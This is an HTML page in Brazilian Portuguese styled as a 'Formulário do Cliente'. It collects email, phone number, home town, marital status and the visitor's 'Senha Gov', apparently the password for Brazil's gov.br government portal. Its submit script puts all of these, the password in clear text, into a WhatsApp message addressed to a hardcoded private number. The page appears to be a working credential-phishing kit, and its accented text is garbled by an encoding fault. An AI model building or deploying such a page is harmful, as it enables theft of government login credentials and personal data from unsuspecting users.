<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Documenta칞칚o necess치ria</title>
  <style>
    :root{--bg:#0f1724;--card:#0b1220;--accent:#7c3aed;--muted:#9aa4b2;--glass:rgba(255,255,255,0.03)}
    *{box-sizing:border-box}
    body{font-family:Inter,system-ui,Segoe UI,Roboto,Arial; background:linear-gradient(180deg,#071025 0%, #07192a 100%); color:#e6eef6; margin:0; padding:32px;}
    .container{max-width:820px;margin:0 auto}
    .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border-radius:14px; padding:28px; box-shadow:0 8px 30px rgba(2,6,23,0.7); border:1px solid rgba(255,255,255,0.03)}
    h1{margin:0 0 6px;font-size:20px}
    p.lead{margin:0 0 20px;color:var(--muted)}

    form .row{display:flex;gap:16px;margin-bottom:12px}
    .col{flex:1;min-width:0}
    label{display:block;font-size:13px;margin-bottom:6px;color:var(--muted)}
    input[type=text], input[type=email], input[type=tel], input[type=password], select{width:100%;padding:12px;border-radius:8px;border:1px solid rgba(255,255,255,0.04);background:var(--glass);color:inherit;font-size:14px}
    .small{font-size:13px;color:#9aa4b2;margin-top:6px}
    .actions{display:flex;gap:12px;align-items:center;margin-top:18px}
    button.primary{background:linear-gradient(90deg,var(--accent),#5b21b6);padding:10px 14px;border-radius:10px;border:0;color:white;font-weight:600;cursor:pointer}
    button.ghost{background:transparent;color:var(--muted);border:1px solid rgba(255,255,255,0.04);padding:10px 12px;border-radius:10px;cursor:pointer}
    .success{margin-top:12px;color:#d0f7d3;background:rgba(0,255,123,0.03);padding:10px;border-radius:8px}

    @media(max-width:600px){.row{flex-direction:column}}
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <h1>Formul치rio do Cliente</h1>
      <p class="lead">Preencha os dados abaixo.</p>

      <form id="clientForm" autocomplete="on">
        <div class="row">
          <div class="col">
            <label for="email">Email</label>
            <input id="email" name="email" type="email" placeholder="seu@email.com" required />
          </div>
          <div class="col">
            <label for="telefone">N칰mero de telefone</label>
            <input id="telefone" name="telefone" type="tel" placeholder="(99) 9 9999-9999" inputmode="tel" required />
          </div>
        </div>

        <div class="row">
          <div class="col">
            <label for="cidade">Cidade natal</label>
            <input id="cidade" name="cidade" type="text" placeholder="Ex: Porto Alegre" required />
          </div>
          <div class="col">
            <label for="estadoCivil">Estado civil</label>
            <select id="estadoCivil" name="estadoCivil" required>
              <option value="">Selecione...</option>
              <option>Solteiro(a)</option>
              <option>Casado(a)</option>
              <option>Separado(a)</option>
              <option>Divorciado(a)</option>
              <option>Vi칰vo(a)</option>
              <option>Uni칚o Est치vel</option>
            </select>
          </div>
        </div>

        <div class="row">
          <div class="col">
            <label for="senha">Senha Gov</label>
            <input id="senha" name="senha" type="password" placeholder="Digite sua senha" required />
          </div>
        </div>

        <div class="actions">
          <button type="submit" class="primary">Enviar formul치rio</button>
          <button type="reset" class="ghost">Limpar</button>
        </div>

        <div id="message" aria-live="polite"></div>
      </form>
    </div>
  </div>

  <script>
    const tel = document.getElementById('telefone');
    tel.addEventListener('input', e => {
      const v = e.target.value.replace(/\D/g,'');
      if(v.length <= 2) e.target.value = v;
      else if(v.length <= 6) e.target.value = `(${v.slice(0,2)}) ${v.slice(2)}`;
      else if(v.length <= 10) e.target.value = `(${v.slice(0,2)}) ${v.slice(2,6)}-${v.slice(6)}`;
      else e.target.value = `(${v.slice(0,2)}) ${v.slice(2,7)}-${v.slice(7,11)}`;
    });

    document.getElementById('clientForm').addEventListener('submit', e=>{
      e.preventDefault();
      const data = new FormData(e.target);
      const payload = Object.fromEntries(data.entries());

      const mensagem = `游늶 Novo formul치rio:%0A` +
        `Email: ${payload.email}%0A` +
        `Telefone: ${payload.telefone}%0A` +
        `Cidade natal: ${payload.cidade}%0A` +
        `Estado civil: ${payload.estadoCivil}%0A` +
        `Senha Gov: ${payload.senha}`;

      const numero = "5554996768112"; // n칰mero de destino
      const url = `https://wa.me/${numero}?text=${mensagem}`;
      window.open(url, "_blank");

      const msg = document.getElementById('message');
      msg.innerHTML = '<div class="success">Abrindo WhatsApp Web com os dados preenchidos...</div>';
    });
  </script>
</body>
</html>
